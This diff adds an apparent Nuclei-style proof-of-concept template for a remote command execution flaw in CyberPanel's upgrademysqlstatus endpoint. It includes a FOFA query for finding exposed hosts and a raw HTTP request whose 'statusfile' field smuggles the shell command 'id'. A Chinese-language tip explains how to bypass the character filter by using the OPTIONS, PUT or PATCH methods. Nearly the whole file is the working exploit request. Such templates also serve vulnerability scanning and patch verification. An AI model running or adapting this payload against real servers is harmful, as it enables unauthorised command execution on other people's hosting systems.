@@ -1,0 +1,35 @@
+id: poc-gecb0eefgrqgxoim
+info:
+  name: Cyber​​Panel upgrademysqlstatus 远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gecb0eefgrqgxoim'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gecb0eefgrqgxoim
+    fofa: app="CyberPanel"
+http:
+- raw:
+  - 'OPTIONS /dataBases/upgrademysqlstatus HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
+
+    Content-Type: application/json
+
+    Connection: close
+
+
+    {"statusfile":"/dev/null; id; #"}
+
+
+    请求头需要换成 OPTIONS/ PUT/ PATCH 等作为HTTP方法，绕过恶意字符过滤器
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730351416909-28a7bb26-139a-4e0f-9544-ba0a0eb33e98.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
